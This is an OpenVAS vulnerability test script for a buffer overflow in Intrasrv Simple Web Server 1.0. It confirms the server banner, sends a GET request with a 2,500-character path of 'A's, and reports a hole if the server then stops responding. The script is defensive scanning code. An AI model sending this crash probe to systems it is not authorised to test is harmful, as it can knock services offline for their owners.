###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_intrasrv_simple_webserver_rce_n_bof_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Intrasrv Simple Web Server RCE and Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let remote unauthenticated attackers to
  cause a denial of service or execute arbitrary code.
  Impact Level: System/Application";

tag_affected = "Intrasrv Simple Web Server version 1.0";
tag_insight = "The flaw is due to an error when handling certain Long requests, which
  can be exploited to cause a denial of service or remote code execution.";
tag_solution = "No solution or patch is available as of 31st, May 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.leighb.com";
tag_summary = "This host is running Intrasrv Simple Web Server and is prone to remote code
  execution vulnerability.";

if(description)
{
  script_id(902973);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-05-31 11:32:38 +0530 (Fri, 31 May 2013)");
  script_name("Intrasrv Simple Web Server RCE and Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://en.securitylab.ru/poc/440852.php");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/25836");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/intrasrv-simple-web-server-10-code-execution");
  script_description(desc);
  script_summary("Check Intrasrv Simple Web Server is vulnerable by sending crafted packets");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

req = "";
res = "";
port = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port =  80;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

banner = get_http_banner(port:port);

## Confirm the application before trying exploit
if("Server: intrasrv" >!< banner){
  exit(0);
}

## Send crafted data to server
req = http_get(item:crap(data:"A", length:2500), port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Send and Receive the response
req = http_get(item:"/",  port:port);
res = http_send_recv(port:port, data:req);

## Confirm the server is dead or not
if(!res && http_is_dead(port:port))
{
  security_hole(port);
  exit(0);
}
